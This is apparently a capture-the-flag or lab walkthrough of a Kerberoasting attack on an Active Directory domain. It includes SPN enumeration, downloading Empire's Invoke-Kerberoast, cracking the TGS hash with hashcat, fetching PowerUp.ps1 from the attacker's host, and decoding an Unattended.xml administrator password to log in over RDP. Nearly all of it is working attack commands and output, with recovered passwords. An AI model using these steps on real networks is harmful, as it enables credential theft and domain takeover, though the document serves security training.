Kerberoasting
=============

Usefull https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md

## Powershell Service Principal Name(SPN) Mapping Service and Account
~~~bash
setspn -T medin -Q */*
~~~

User enumeated to CN=**fela**,CN=Users,DC=corp,DC=Local

Powershell Invoke-Kerberoast script
~~~bash
powershell -c "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')" 
~~~

## Invoke-Kerberoast
~~~bash
.\Invoke-Kerbroast.ps1 -OutputFormat Hashcat |fl
~~~

Make sure to save the hash on **1 Line**, save in a text file to crack

## Hashcat
~~~bash
hashcat -m 13100 -a 0 extracted /usr/share/wordlists/rockyou.txt --force
~~~

~~~bash
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$krb5tgs$23$*fela$corp.local$HTTPfela*$bc1fe3e4cc81abb946f6eb0ad7051687$1d5dc1ef47a761e0903c3f60606dd2675ad35b1ec6738c87c593f6ce477190988d4225d1abe7616030e48380680535fe1ce3588f04adecdbd332dd0b5108391e2161e4bbce69aaf5708af88debb7a0ab18da31fc34ec6e1a40d25a25c21d51e82e3bba11277774d8bcb7c54b94ec94f1e3c4106e2537122c77a4bb444c02db0d01365c098662b6e416fb4620dc9ef83ba99b7f5a2c2f49687a19fd485115eaaa8a10e34042d93d407fb7d933a84a89068158f8450300010c118a90a89372c9be36fa35350e434084517d2d0557c1aa30953066acbe0e0122ada8652540ea346f073e7d396bb45469dd8a8e7036db806282a409ee6206f1226188e2716197594db9e35c89414cf744b3d0ab3d30000d717936ccfa67cc3af793ffff15357845a6c3159b5ab35f36ae38bf4849c2fee2e5963a8a39c9d32a1a5ff3425dcaa244fab1d66c31d62e052095085a342337adc6bd5cb928137c8b51a28809cc39f7bd59292b219fd05725f9352e493274448b9e91b847641775e642ff127954890fb3dc256508a9677bddd56da655fbb93574a0901258c45c4fc8c361a70c48cd907bcda0381a2f64e1668cdeef524c4cd8e77ee33650566496618404d186c7135c7041cc2c6df3dbd2f7cd28234b2e12e3491e0e6d0604d769eeca46fb5b14b6720ef2709e2f4fdb762dc3db9b7f36648f32c5a4e5fa21ddc970323053b037a274559b329ce46f8fe9a4a06d6e2833488d766df1aef8c593309f59cd8fb492f98f2b987656424dd116ac603d943ae680ea628b047f4cdd2e116bae5cfb6f7757ff5926265712076d255cb7843c746698ca027d2f26823e7646953b4912d839741fcd82edc0ae2af31070994c713295c43d1d9098bea2211e449c4e5012f51cb2743ff9603864050ae9ba5e21b09c1c7225cf8068f3351e8f26ecb4069acab198e97fe5ce98c18ecba9700d6f1b40166df254c8cfb9b02c4d19cae2b7ecf2c30fd6a0654be8939f83eb357b308827029a1fcc46a2de0de6e5171cf4e68e5574926cf550783e47acdac5cb67311c39c115c1b9e7affedfe5ba0ced9085a882a3559506341c611eaa950443acd64a05e2313ace848685b981795a91edc67fea48dfd081d4d6b2e6909a3df0c2762dee766062aa39ac8aaf610bc8ee09e7d1d54e65bf3dccd42530274f99ce37fc787db1da2282a12d248cf454dfa73fd54235a66132a2182e9ecd5c6a9100961e1ea57bf661e1721fd6f2de02eccd229c06d6da73316a09847aac3e0aa7c8e5d2a83ceb6ef20f057eb89c58a98c624d8de8ad0b7637b9bcf42468f216a4204b8f112f2eeaddf1b5b498a05a2e23b55c3c1d60addc58c664045838cc158daa5799518c635308267f9db6df842b39d294d603c5c2b7d6d951d3:rubenF124
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*fela$corp.local$HTTPfela*$bc1fe3e4cc81...d951d3
Time.Started.....: Tue Nov 15 17:43:32 2022, (4 secs)
Time.Estimated...: Tue Nov 15 17:43:36 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1094.9 kH/s (5.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4136960/14344385 (28.84%)
Rejected.........: 0/4136960 (0.00%)
Restore.Point....: 4128768/14344385 (28.78%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ruddrooney -> rsqqst78en
Hardware.Mon.#1..: Util: 29%

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Tue Nov 15 17:42:59 2022
Stopped: Tue Nov 15 17:43:38 2022
~~~

Login as user
~~~bash
xfreerdp /u:'corp\fela' /v:<IP ADDR>}
~~~

# Prvilege Escalation

PowerUp.ps1 is great for enumeration
~~~bash
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
~~~

Host a webserver and input on the target machine
~~~bash
Invoke-WebRequest http://10.8.12.24:80/PowerUp.ps1 -OutFile PowerUp.ps1
~~~

Now to add this
~~~bash
Import-Module .\PowerUp.ps1
~~~

~~~bash
Invoke-AllChecks

[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.

[*] Checking for unquoted service paths...

[*] Checking service executable and argument permissions...

[*] Checking service permissions...

[*] Checking %PATH% for potentially hijackable .dll locations...

HijackablePath : C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile
                 'C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' -Command
                 '...'

[*] Checking for AlwaysInstallElevated registry key...

[*] Checking for Autologon credentials in registry...

[*] Checking for vulnerable registry autoruns and configs...

[*] Checking for vulnerable schtask files/configs...

[*] Checking for unattended install files...

UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml

[*] Checking for encrypted web.config strings...

[*] Checking for encrypted application pool and virtual directory passwords...
~~~

We see **UnattendPath**
~~~
PS C:\Windows\Panther\Unattend> more .\Unattended.xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
~~~

Lets Decode this base64 password and login
~~~bash
echo 'dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=' | base64 --decode
tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T 
~~~

~~~bash
xfreerdp /u:Administrator /d:corp /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' /v:10.10.189.239 
~~~
